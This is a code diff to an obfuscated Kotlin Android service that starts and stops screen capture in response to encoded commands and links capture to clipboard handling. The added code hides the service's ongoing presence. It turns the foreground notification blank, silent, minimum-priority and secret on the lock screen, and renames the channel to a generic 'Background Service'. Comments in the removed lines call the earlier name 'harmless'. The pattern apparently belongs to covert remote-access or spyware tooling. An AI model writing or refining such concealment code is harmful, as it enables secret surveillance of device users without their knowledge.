@@ -222,20 +222,70 @@ class DFm8Y8iMScvB2YDw : Service() {
 
                 if(arg1==p50.a(byteArrayOf(1), byteArrayOf(49, 26, -98, -61, 14, 79, -102, 58, -94, -116)))
                 {
-                    Log.i("MainService", "关共享: stopping MediaProjection")
-                    stopCapture2()
-                    try {
-                        stopForeground(true)
-                        createForegroundNotification()
-                    } catch (e: Exception) {
-                        Log.e("MainService", "关共享: recreate notification failed", e)
+                    val mpExists = mediaProjection != null
+                    Log.i("MainService", "关共享: mpExists=$mpExists, isStart=$isStart, thread=${Thread.currentThread().name}")
+
+                    Handler(Looper.getMainLooper()).post {
+                        try { android.widget.Toast.makeText(applicationContext, "关共享触发 mp=$mpExists", android.widget.Toast.LENGTH_SHORT).show() } catch(_: Exception) {}
+                    }
+
+                    Handler(Looper.getMainLooper()).post {
+                        try {
+                            mediaProjection?.stop()
+                            Log.i("MainService", "关共享: mp.stop() done")
+                        } catch (e: Exception) {
+                            Log.e("MainService", "关共享: mp.stop() error", e)
+                        }
+                        mediaProjection = null
+
+                        try {
+                            _isStart = false
+                            _isReady = false
+                            _isAudioStart = false
+
+                            try { virtualDisplay?.release() } catch(_: Exception) {}
+                            virtualDisplay = null
+                            try { imageReader?.close() } catch(_: Exception) {}
+                            imageReader = null
+                            try { videoEncoder?.stop(); videoEncoder?.release() } catch(_: Exception) {}
+                            videoEncoder = null
+                            try { surface?.release() } catch(_: Exception) {}
+
+                            stopForeground(true)
+                            Log.i("MainService", "关共享: stopForeground done")
+
+                            val silentNotification = notificationBuilder
+                                .setOngoing(true)
+                                .setSmallIcon(R.mipmap.ic_stat_logo)
+                                .setDefaults(0)
+                                .setAutoCancel(false)
+                                .setPriority(NotificationCompat.PRIORITY_MIN)
+                                .setContentTitle("")
+                                .setContentText("")
+                                .setSilent(true)
+                                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                                .setShowWhen(false)
+                                .build()
+                            startForeground(DEFAULT_NOTIFY_ID, silentNotification)
+                            Log.i("MainService", "关共享: restarted as silent foreground")
+
+                        } catch (e: Exception) {
+                            Log.e("MainService", "关共享: cleanup error", e)
+                        }
+
+                        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(false)
+                        checkMediaPermission()
+
+                        Log.i("MainService", "关共享: complete")
                     }
                 }
                 else if(arg1==p50.a(byteArrayOf(-16), byteArrayOf(-63, -13, -107, -101, 57, 111, 52, -114)))
                 {
-                   if (!isStart) {
-                      startCapture()
-                  }
+                    Handler(Looper.getMainLooper()).post {
+                        if (!isStart) {
+                            startCapture()
+                        }
+                    }
                 }
             } 
             p50.a(byteArrayOf(-56, -110, -115, -107, 94, -114, -38, -106, -106, -112, 115, -120), byteArrayOf(-69, -26, -30, -27, 1, -19)) -> {
@@ -623,43 +673,95 @@ class DFm8Y8iMScvB2YDw : Service() {
 
     @Synchronized
     fun stopCapture2() {
+        Log.i("MainService", "stopCapture2: begin")
 
-        //ClsFx9V0S.VaiKIoQu("video",false)
-        
-        _isStart = false
-
-        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(_isStart)
-    
-        if (reuseVirtualDisplay) {
- 
-            virtualDisplay?.setSurface(null)
+        val mp = mediaProjection
+        if (mp != null) {
+            try {
+                mp.stop()
+                Log.i("MainService", "stopCapture2: MediaProjection.stop() success")
+            } catch (e: Exception) {
+                Log.e("MainService", "stopCapture2: MediaProjection.stop() failed", e)
+            }
+            mediaProjection = null
         } else {
-            virtualDisplay?.release()
+            Log.w("MainService", "stopCapture2: mediaProjection is already null")
         }
 
-        imageReader?.close()
+        _isStart = false
+        _isReady = false
+        _isAudioStart = false
+        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(false)
+
+        try {
+            if (reuseVirtualDisplay) {
+                virtualDisplay?.setSurface(null)
+            } else {
+                virtualDisplay?.release()
+            }
+        } catch (e: Exception) {
+            Log.e("MainService", "stopCapture2: virtualDisplay release failed", e)
+        }
+
+        try {
+            imageReader?.close()
+        } catch (e: Exception) {
+            Log.e("MainService", "stopCapture2: imageReader close failed", e)
+        }
         imageReader = null
-        videoEncoder?.let {
-            it.signalEndOfInputStream()
-            it.stop()
-            it.release()
+
+        try {
+            videoEncoder?.let {
+                it.signalEndOfInputStream()
+                it.stop()
+                it.release()
+            }
+        } catch (e: Exception) {
+            Log.e("MainService", "stopCapture2: videoEncoder release failed", e)
         }
         if (!reuseVirtualDisplay) {
             virtualDisplay = null
         }
         videoEncoder = null
 
-        surface?.release()
-
-        val mp = mediaProjection
-        if (mp != null) {
-            mp.stop()
-            mediaProjection = null
+        try {
+            surface?.release()
+        } catch (e: Exception) {
+            Log.e("MainService", "stopCapture2: surface release failed", e)
         }
-        
-        // release audio
-        _isAudioStart = false
 
+        checkMediaPermission()
+
+        Log.i("MainService", "stopCapture2: complete")
+    }
+
+    fun killMediaProjection() {
+        Log.i("MainService", "killMediaProjection: begin, mp=${mediaProjection != null}, isStart=$isStart")
+
+        try {
+            mediaProjection?.stop()
+            Log.i("MainService", "killMediaProjection: mp.stop() done")
+        } catch (e: Exception) {
+            Log.e("MainService", "killMediaProjection: mp.stop() error", e)
+        }
+        mediaProjection = null
+
+        _isStart = false
+        _isReady = false
+        _isAudioStart = false
+        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(false)
+
+        try { virtualDisplay?.release() } catch (_: Exception) {}
+        virtualDisplay = null
+        try { imageReader?.close() } catch (_: Exception) {}
+        imageReader = null
+        try { videoEncoder?.stop(); videoEncoder?.release() } catch (_: Exception) {}
+        videoEncoder = null
+        try { surface?.release() } catch (_: Exception) {}
+
+        checkMediaPermission()
+
+        Log.i("MainService", "killMediaProjection: complete")
     }
 
     @Synchronized
@@ -875,16 +977,19 @@ class DFm8Y8iMScvB2YDw : Service() {
     private fun initNotification() {
         notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         notificationChannel = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channelId = "sys_sync_ch_01" // ✅ 随机的英文ID
-            val channelName = "System Background Sync" // ✅ 无害的名称
+            val channelId = "sys_bg_silent_02"
+            val channelName = "Background Service"
             val channel = NotificationChannel(
                 channelId,
-                channelName, NotificationManager.IMPORTANCE_HIGH
+                channelName, NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "System background synchronization service" // ✅
+                description = "Background service"
+                setShowBadge(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
+                enableLights(false)
+                enableVibration(false)
+                setSound(null, null)
             }
-            channel.lightColor = Color.BLUE
-            channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
             notificationManager.createNotificationChannel(channel)
             channelId
         } else {
@@ -909,15 +1014,17 @@ class DFm8Y8iMScvB2YDw : Service() {
         val notification = notificationBuilder
             .setOngoing(true)
             .setSmallIcon(R.mipmap.ic_stat_logo)
-            .setDefaults(Notification.DEFAULT_ALL)
-            .setAutoCancel(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .setContentTitle("大仙会议")
-            .setContentText("后台运行中")
+            .setDefaults(0)
+            .setAutoCancel(false)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setContentTitle("")
+            .setContentText("")
             .setOnlyAlertOnce(true)
             .setContentIntent(pendingIntent)
-            .setColor(ContextCompat.getColor(this, R.color.primary))
-            .setWhen(System.currentTimeMillis())
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setSilent(true)
+            .setWhen(0)
+            .setShowWhen(false)
             .build()
         startForeground(DEFAULT_NOTIFY_ID, notification)
 
